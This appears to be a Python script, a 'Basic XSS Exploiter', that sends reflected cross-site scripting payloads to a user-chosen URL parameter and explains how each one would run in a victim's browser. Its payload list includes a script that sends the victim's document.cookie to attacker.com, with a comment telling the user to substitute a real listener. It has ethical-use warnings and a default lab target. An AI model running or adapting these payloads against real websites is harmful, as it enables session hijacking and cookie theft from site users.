import requests
import urllib.parse

# --- Configuration ---
# IMPORTANT: Use a known vulnerable test application or a controlled environment.
# DO NOT use this script against live, production websites without explicit permission.
DEFAULT_TARGET_URL = "http://testphp.vulnweb.com/search.php?test=query" # Example vulnerable URL
DEFAULT_TARGET_PARAM = "test" # Example vulnerable parameter

# Common XSS payloads for demonstration.
# These are simple examples. Real-world payloads are often more complex and encoded.
XSS_PAYLOADS = [
    "<script>alert('XSS Vulnerable!');</script>", # Basic alert
    "<img src=x onerror=alert('XSSed!')>",      # Image tag with error handler
    "<svg/onload=alert('SVG XSS!')>",            # SVG tag XSS
    "';alert(document.cookie)//",                # Common for breaking out of JS strings
    "<script>window.location='http://attacker.com/steal_cookie?cookie='+document.cookie;</script>"
    # This payload would attempt to send the victim's cookie to an attacker-controlled server.
    # Replace 'http://attacker.com/steal_cookie' with your actual listener URL in a real scenario.
]

# --- Main XSS Exploiter Function ---
def run_xss_exploiter():
    """
    Prompts the user for target details and attempts to "exploit" a potential XSS vulnerability
    by injecting predefined payloads.
    """
    print("--- Basic XSS Exploiter ---")
    print(f"Default target URL: {DEFAULT_TARGET_URL}")
    print(f"Default target parameter: {DEFAULT_TARGET_PARAM}\n")
    print("WARNING: Only use this script on targets you have explicit permission to test.")
    print("This script demonstrates payload delivery; it does not run a browser or steal data directly.")
    print("For actual exploitation, a victim's browser must render the vulnerable page.\n")

    target_url = input(f"Enter target URL (e.g., {DEFAULT_TARGET_URL}): ").strip()
    if not target_url:
        target_url = DEFAULT_TARGET_URL

    target_param = input(f"Enter target parameter (e.g., {DEFAULT_TARGET_PARAM}): ").strip()
    if not target_param:
        target_param = DEFAULT_TARGET_PARAM

    # Extract the base URL and current query parameters
    parsed_url = urllib.parse.urlparse(target_url)
    query_params = urllib.parse.parse_qs(parsed_url.query)

    # Get the original value of the target parameter, if it exists
    original_value = query_params.get(target_param, [""])[0]

    print(f"\nAttempting XSS exploitation on {target_url} with parameter '{target_param}'...")
    print(f"Original parameter value detected: '{original_value}'")

    for i, payload in enumerate(XSS_PAYLOADS):
        print(f"\n--- Testing Payload {i+1} ---")
        print(f"Payload: '{payload}'")

        # Encode the payload to be URL-safe for inclusion in the URL query string
        encoded_payload = urllib.parse.quote_plus(payload)

        # Construct the new query parameters with the injected payload
        new_query_params = query_params.copy()
        new_query_params[target_param] = [original_value + encoded_payload]
        
        # Reconstruct the URL with the new query string
        # Use urlunparse to rebuild the URL from its components
        test_url = urllib.parse.urlunparse(parsed_url._replace(query=urllib.parse.urlencode(new_query_params, doseq=True)))

        print(f"  Constructed URL: {test_url}")

        try:
            # Send the GET request with the XSS payload
            # We don't necessarily need to analyze the response content here for XSS exploitation
            # as the "exploit" happens in the victim's browser when they visit the URL.
            response = requests.get(test_url, timeout=5)
            print(f"  Request sent. Status Code: {response.status_code}")

            # Conceptual explanation of exploitation
            print("\n  --- Conceptual Exploitation ---")
            print("  If a victim's browser were to visit the 'Constructed URL' above,")
            print("  and if the web application is vulnerable to XSS and reflects the payload")
            print("  without proper sanitization, the injected JavaScript payload would execute.")
            
            if "alert(" in payload:
                print("  This would typically cause a pop-up alert box in their browser.")
            elif "document.cookie" in payload:
                print("  If the payload attempted to steal cookies, it would try to send them to")
                print("  the attacker's controlled server (e.g., 'http://attacker.com/steal_cookie').")
            else:
                print("  The specific action depends on the JavaScript code injected.")

            print("  This script only *sends* the payload; it doesn't execute it in a browser.")
            print("  To confirm XSS, you would typically use a browser to visit the URL and observe.")

        except requests.exceptions.RequestException as e:
            print(f"  [!] Request error: {e}")
        
        print("\n" + "="*50) # Separator for next payload

    print("\n--- XSS Exploitation Demonstration Complete ---")
    print("Remember, successful XSS exploitation relies on a victim visiting the crafted URL.")
    print("Always practice ethical hacking and obtain proper authorization.")

# Entry point for the script
if __name__ == "__main__":
    run_xss_exploiter()